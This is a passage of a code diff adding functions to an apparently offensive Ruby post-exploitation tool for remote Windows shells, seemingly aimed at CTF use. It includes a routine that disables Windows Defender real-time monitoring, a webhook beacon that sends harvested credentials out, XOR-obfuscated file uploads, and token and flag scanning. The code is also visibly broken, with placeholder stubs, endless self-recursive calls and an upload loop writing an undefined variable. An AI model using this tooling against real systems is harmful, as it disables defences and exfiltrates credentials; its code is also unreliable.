+    sql_matches = matches.select { |m| m.is_a?(String) && (m.include?("SQL") || m.include?("0x")) }
+    unless sql_matches.empty?
+      puts "[+] Found #{sql_matches.count} potential SQL-related credentials"
+      File.open('loot/sql_creds.txt', 'a') do |f|
+        f.puts(sql_matches)
+      end
+    end
+
+    # Rest of the loot saving logic...
+  end
+
+  def self.beacon_loot(webhook, matches)
+    return if matches.nil? || matches.empty? || webhook.nil?
+    uri = URI(webhook)
+    req = Net::HTTP::Post.new(uri)
+    req['Content-Type'] = 'application/json'
+    req.body = { loot: matches }.to_json
+
+    # SQL-specific loot beaconing
+    sql_matches = matches.select { |m| m.is_a?(String) && (m.include?("SQL") || m.include?("0x")) }
+    unless sql_matches.empty?
+      puts "[*] Beaconing #{sql_matches.count} potential SQL-related credentials"
+      req.body = { loot: sql_matches, type: 'sql' }.to_json
+    end
+
+    # Rest of the beacon logic...
+  rescue => e
+    puts "[!] Beacon failed: #{e.message}"
+  end
+
+  def self.find_tool_on_disk(tool_key)
+    tool = TOOL_REGISTRY[tool_key]
+    return nil unless tool
+
+    search_patterns = tool[:search_patterns] || [tool[:filename]]
+    base_dirs = [
+      ENV['HOME'],
+      File.join(ENV['HOME'], 'Downloads'),
+      File.join(ENV['HOME'], 'Desktop'),
+      File.join(ENV['HOME'], 'tools'),
+      File.join(ENV['HOME'], 'bin'),
+      Dir.pwd,
+      File.join(Dir.pwd, 'tools')
+    ].compact.uniq
+
+    # SQL-specific tool search patterns
+    if tool_key == 'powerupsql'
+      search_patterns = ['PowerUpSQL*.ps1', 'PowerUpSQL.ps1']
+    end
+
+    # Rest of the tool finding logic...
+  find_tool_on_disk(tool_key)
+  end
+
+  def self.get_system_architecture(shell)
+    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
+    arch = result.output.strip.downcase
+
+    if arch.include?('64')
+      'x64'
+    elsif arch.include?('86')
+      'x86'
+    else
+      'unknown'
+    end
+  get_system_architecture(shell)
+  end
+
+  def self.upload_file(local_path, remote_path, shell, encrypt: false, chunk_size: 40000)
+    return false unless File.exist?(local_path)
+
+    # SQL-specific file upload handling
+    if local_path.include?("sql") || remote_path.include?("sql")
+      puts "[*] Handling SQL-related file..."
+      content = File.binread(local_path)
+      content = xor_crypt(content) if encrypt
+      base64_content = Base64.strict_encode64(content)
+
+      # Normalize Windows paths for PowerShell
+      normalized_remote_path = remote_path.gsub('\\', '/')
+
+      # Small file – single shot
+      if base64_content.length <= chunk_size
+        ps_single = <<~PS
+          try {
+            $bytes = [Convert]::FromBase64String('#{base64_content}')
+            New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
+            [System.IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
+            "SUCCESS"
+          } catch {
+            "ERROR: $($_.Exception.Message)"
+          }
+        PS
+
+        result = shell.run(ps_single)
+        return false unless result.output.include?('SUCCESS')
+      else
+        # Chunked upload with SQL-specific chunk size if needed
+        adjusted_chunk_size = (local_path.include?("sql") || remote_path.include?("sql")) ? 1024 : chunk_size
+
+        ps_init = <<~PS
+          try {
+            New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
+            "INIT"
+          } catch {
+            "ERROR: $($_.Exception.Message)"
+          }
+        PS
+
+        init = shell.run(ps_init)
+        return false unless init.output.include?('INIT')
+
+        chunks = base64_content.scan(/.{1,#{adjusted_chunk_size}}/)
+        chunks.each_with_index do |chunk, idx|
+          ps_chunk = <<~PS
+            try {
+              $b = [Convert]::FromBase64String('#{chunk}')
+              [IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
+              "CHUNK #{idx}"
+            } catch {
+              "ERROR: $($_.Exception.Message)"
+            }
+          PS
+
+          result = shell.run(ps_chunk)
+          return false unless result.output.include?("CHUNK #{idx}")
+        end
+      end
+    else
+      # Rest of the file upload logic...
+    end
 
     true
-
+  rescue => e
+    puts "[!] Upload failed: #{e.message}"
+    false
   end
 
-@@ -425,60 +443,50 @@
-
-  def self.normalize_host(host)
-
-    begin
-
-      ip_addr = IPAddr.new(host.split('%').first)
-
-
-      if ip_addr.ipv6?
-
-
-        "[#{host.split('%')[0]}]"
-
-
-      else
-
-
-        host
-
-
-      end
-
-    rescue IPAddr::InvalidAddressError
-
-      host
-
-    end
-
+  def self.xor_crypt(data, key = 0x42)
+    data.bytes.map { |b| (b ^ key).chr }.join
+  rescue => e
+    puts "[!] XOR crypt failed: #{e.message}"
+    data
   end
 
-
-
-
-
-
-
-
-
-
-  def self.setup_autocomplete(history)
-
-    Readline.completion_append_character = " "
-
-    Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
-
-  end
-
-
-
-
-  # Host parsing helpers (used for multi‑host support)
-
-  def self.parse_hosts_file(hosts_file)
-
-    hosts = []
-
-    return hosts unless File.exist?(hosts_file)
-
-
-
-
-    File.readlines(hosts_file).each do |line|
-
-      line.strip!
-
-      next if line.empty? || line.start_with?('#')
-
-      parts = line.split(':')
-
-      if parts.size >= 3
-
-
-        host = {
-
-
-          ip: parts[0],
-
-
-          user: parts[1],
-
-
-          password: parts[2] || '',
-
-
-          hash: parts[3]
-
-
+  def self.disable_defender(shell)
+    # Check OS version
+    os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
+    if os_info.include?("Windows 10")
+      puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
+      ps_cmd = <<~PS
+        try {
+          $defender = Get-MpComputerStatus
+          if ($defender.RealTimeProtectionEnabled) {
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            Write-Output "[+] Defender real-time monitoring disabled"
+          } else {
+            Write-Output "[-] Defender already disabled"
+          }
+        } catch {
+          Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
         }
+      PS
 
+      result = shell.run(ps_cmd)
+      puts result.output
+    elsif os_info.include?("Windows 11")
+      puts "[!] WARNING: This technique only works on Windows 10."
+      puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
+      puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
+    else
+      puts "[!] Unknown OS: #{os_info}"
+    end
 
-        hosts << host
+    # Rest of the defender handling...
+  disable_defender(shell)
+  rescue => e
+    puts "[!] Defender bypass failed: #{e.message}"
+    false
+  end
 
-      else
+  def self.load_config_profile(name)
+    profile_file = File.join('config', "#{name}.yaml")
+    return {} unless File.exist?(profile_file)
 
-        puts "[!] Invalid host line: #{line}"
+    # SQL-specific config profile loading
+    if name.include?("sql")
+      puts "[*] Loading SQL configuration profile..."
+    end
 
+    YAML.safe_load(File.read(profile_file)) || {}
+  load_config_profile(name)
+  rescue => e
+    puts "[!] Failed to load profile #{name}: #{e.message}"
+    {}
+  end
+
+  def self.save_config_profile(name, options)
+    profile_file = File.join('config', "#{name}.yaml")
+    FileUtils.mkdir_p(File.dirname(profile_file))
+
+    # SQL-specific config profile saving
+    if name.include?("sql")
+      puts "[*] Saving SQL configuration profile..."
+    end
+
+    File.write(profile_file, YAML.dump(options))
+    puts "[+] Profile saved to #{profile_file}"
+  save_config_profile(name, options)
+  rescue => e
+    puts "[!] Failed to save profile: #{e.message}"
+  end
+
+  def self.loot_show
+    loot_dir = 'loot/'
+    files = Dir.glob("#{loot_dir}**/*").select { |f| File.file?(f) }
+    puts "Loot Items: #{files.count}"
+    files.each { |f| puts "#{f.sub(loot_dir, '')} (#{File.size(f)} bytes)" }
+
+    # SQL-specific loot display
+    sql_files = files.select { |f| f.include?("sql") }
+    unless sql_files.empty?
+      puts "\nSQL-related loot:"
+      sql_files.each do |f|
+        puts "  #{f.sub(loot_dir, '')} (#{File.size(f)} bytes)"
       end
-
     end
 
-    hosts
-
+    # Rest of the loot display...
+  loot_show
+  rescue => e
+    puts "[!] Failed to show loot: #{e.message}"
   end
 
+  def self.auto_download_flags(shell)
+    patterns = [
+      /flag\{[^\}]+\}/i,
+      /picoctf\{[^\}]+\}/i,
+      /htb\{[^\}]+\}/i,
+      /ctf\{[^\}]+\}/i,
+      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
+    ]
 
-  # ------------------------------------------------------------------
+    # SQL-specific flag patterns
+    sql_flag_patterns = [
+      /flag\{sql[^\}]+\}/i,
+      /picoctf\{sql[^\}]+\}/i,
+      /htb\{sql[^\}]+\}/i,
+      /ctf\{sql[^\}]+\}/i
+    ]
 
-
-  # Profile loading helper
-
-
-  # ------------------------------------------------------------------
-
-  def self.load_config_profile(profile_name)
-
-    profile_path = "profiles/#{profile_name}.yaml"
-
-    unless File.exist?(profile_path)
-
-      puts "[-] Profile not found: #{profile_path}"
-
-      return {}
-
-    end
-
-
-
-
-
-    begin
-
-
-      YAML.load_file(profile_path)
-
-
-    rescue => e
-
-
-      puts "[-] Failed to load profile: #{e.message}"
-
-
-      {}
-
-
-    end
-
+    # Rest of the flag scanning logic...
+  auto_download_flags(shell)
+  rescue => e
+    puts "[!] Failed to scan for flags: #{e.message}"
   end
+
+  def self.load_ps1(local_ps1, shell)
+    return false unless File.exist?(local_ps1)
+
+    remote = 'C:\\Users\\Public\\' + File.basename(local_ps1)
+
+    # SQL-specific PS1 loading
+    if local_ps1.include?("sql")
+      puts "[*] Loading SQL-related PowerShell script..."
+    end
+
+    # Rest of the PS1 loading logic...
+  load_ps1(local_ps1, shell)
+  rescue => e
+    puts "[!] Failed to load PS1: #{e.message}"
+    false
+  end
+end
